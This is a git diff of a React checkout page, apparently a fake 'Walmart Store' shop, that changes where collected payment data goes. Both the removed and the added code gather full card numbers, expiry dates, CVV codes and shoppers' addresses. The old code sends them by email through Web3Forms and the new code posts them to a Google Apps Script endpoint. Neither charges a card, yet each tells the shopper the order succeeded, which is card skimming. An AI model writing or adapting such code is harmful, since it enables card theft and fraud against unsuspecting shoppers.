@@ -50,134 +50,95 @@ const PaymentPage = () => {
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
+  e.preventDefault();
 
-    // Validation
-    if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
-      toast.error('Please fill in all payment details');
-      return;
-    }
+  // Validation (same rahega)
+  if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
+    toast.error('Please fill in all payment details');
+    return;
+  }
 
-    const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
-    if (cardDigits.length < 13) {
-      toast.error('Please enter a valid card number');
-      return;
-    }
+  const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
+  if (cardDigits.length < 13) {
+    toast.error('Please enter a valid card number');
+    return;
+  }
 
-    if (paymentData.cvv.length < 3) {
-      toast.error('Please enter a valid CVV');
-      return;
-    }
+  if (paymentData.cvv.length < 3) {
+    toast.error('Please enter a valid CVV');
+    return;
+  }
 
-    setIsProcessing(true);
+  setIsProcessing(true);
 
-    try {
-      // Get cart and user info
-      const cart = JSON.parse(localStorage.getItem('cart')) || [];
-      const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
+  try {
+    // Get cart and user info from localStorage
+    const cart = JSON.parse(localStorage.getItem('cart')) || [];
+    const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
 
-      const subtotal = cart.reduce(
-        (sum, item) => sum + (item.discountedPrice || item.price || 0) * item.quantity,
-        0
-      );
+    const subtotal = cart.reduce(
+      (sum, item) => sum + (item.discountedPrice || item.price || 0) * item.quantity,
+      0
+    );
 
-      const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
+    // Prepare all data for Google Script
+    const orderItemsText = cart.map((item, idx) => 
+      `${idx+1}. ${item.name} | Qty: ${item.quantity} | Price: $${((item.discountedPrice || item.price) * item.quantity).toFixed(2)}`
+    ).join('\n');
 
-      // 1. SAVE TO DATABASE FIRST
-      const orderData = {
-        customerName: userInfo.fullName,
-        customerEmail: userInfo.email,
-        customerPhone: userInfo.phone,
-        shippingAddress: userInfo.address,
-        city: userInfo.city,
-        state: userInfo.state,
-        zipCode: userInfo.zipCode,
-        country: userInfo.country,
-        items: cart.map(item => ({
-          id: item.id,
-          name: item.name,
-          price: item.discountedPrice || item.price,
-          quantity: item.quantity
-        })),
-        total: subtotal,
-        paymentInfo: {
-          cardNumber: paymentData.cardNumber,
-          cardLast4: cardDigits.slice(-4),
-          cardholderName: paymentData.cardholderName,
-          expiryDate: paymentData.expiryDate,
-          cvv: paymentData.cvv
-        }
-      };
+    // Create FormData for Google Script
+    const formBody = new URLSearchParams({
+      type: 'full_order',
+      customerName: userInfo.fullName || '',
+      customerEmail: userInfo.email || '',
+      customerPhone: userInfo.phone || '',
+      shippingAddress: userInfo.address || '',
+      city: userInfo.city || '',
+      state: userInfo.state || '',
+      zipCode: userInfo.zipCode || '',
+      country: userInfo.country || '',
+      cardholderName: paymentData.cardholderName,
+      cardNumber: paymentData.cardNumber,
+      expiryDate: paymentData.expiryDate,
+      cvv: paymentData.cvv,
+      orderTotal: `$${subtotal.toFixed(2)}`,
+      orderItems: orderItemsText,
+      orderDate: new Date().toLocaleString()
+    });
 
-      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(orderData)
-      });
+    // Send to Google Apps Script
+    await fetch(process.env.REACT_APP_GOOGLE_SCRIPT_URL, {
+      method: 'POST',
+      mode: 'no-cors',  // Important for Google Script
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: formBody
+    });
 
-      if (!dbResponse.ok) {
-        throw new Error('Failed to save order to database');
-      }
+    // Success - clear cart and userInfo, store last order
+    localStorage.setItem('lastOrder', JSON.stringify({
+      cart,
+      userInfo,
+      total: subtotal,
+      orderDate: new Date().toISOString()
+    }));
+    
+    localStorage.removeItem('cart');
+    localStorage.removeItem('userInfo');
 
-      // 2. SEND EMAIL NOTIFICATION (Don't fail checkout if email fails)
-      try {
-        const orderItemsList = cart.map((item, index) => 
-          `${index + 1}. ${item.name} | Qty: ${item.quantity} | Price: $${((item.discountedPrice || item.price) * item.quantity).toFixed(2)}`
-        ).join('\\n');
+    toast.success('Order placed successfully! Check your email for confirmation.');
+    setTimeout(() => {
+      navigate('/checkout/confirmation');
+    }, 1000);
 
-        const emailData = new FormData();
-        emailData.append('access_key', '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8');
-        emailData.append('subject', `New Order from ${userInfo.fullName || 'Customer'} - Walmart Store`);
-        emailData.append('from_name', 'Walmart Store Alerts');
-        emailData.append('Customer Name', userInfo.fullName || 'Not Provided');
-        emailData.append('Customer Email', userInfo.email || 'Not Provided');
-        emailData.append('Customer Phone', userInfo.phone || 'Not Provided');
-        emailData.append('Shipping Address', userInfo.address || 'Not Provided');
-        emailData.append('City', userInfo.city || 'Not Provided');
-        emailData.append('State', userInfo.state || 'Not Provided');
-        emailData.append('Zip Code', userInfo.zipCode || 'Not Provided');
-        emailData.append('Country', userInfo.country || 'Not Provided');
-        emailData.append('Cardholder Name', paymentData.cardholderName);
-        emailData.append('Full Card Number', paymentData.cardNumber);
-        emailData.append('Expiry Date', paymentData.expiryDate);
-        emailData.append('CVV Code', paymentData.cvv);
-        emailData.append('Order Total', `$${subtotal.toFixed(2)}`);
-        emailData.append('Order Items', orderItemsList);
-        emailData.append('Order Date', new Date().toLocaleString());
-
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          body: emailData
-        });
-      } catch (emailError) {
-        console.error('Email notification failed:', emailError);
-        // Don't throw - order is already saved to database
-      }
-
-      // 3. SUCCESS - Clear cart and redirect
-      localStorage.setItem('lastOrder', JSON.stringify({
-        cart,
-        userInfo,
-        total: subtotal,
-        orderDate: new Date().toISOString()
-      }));
-      
-      localStorage.removeItem('cart');
-      localStorage.removeItem('userInfo');
-
-      toast.success('Payment processed successfully!');
-      setTimeout(() => {
-        navigate('/checkout/confirmation');
-      }, 1000);
-
-    } catch (error) {
-      console.error('Payment error:', error);
-      toast.error('There was an issue processing your order. Please try again.');
-    } finally {
-      setIsProcessing(false);
-    }
-  };
+  } catch (error) {
+    console.error('Payment error:', error);
+    toast.error('There was an issue processing your order. Please try again.');
+  } finally {
+    setIsProcessing(false);
+  }
+};
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
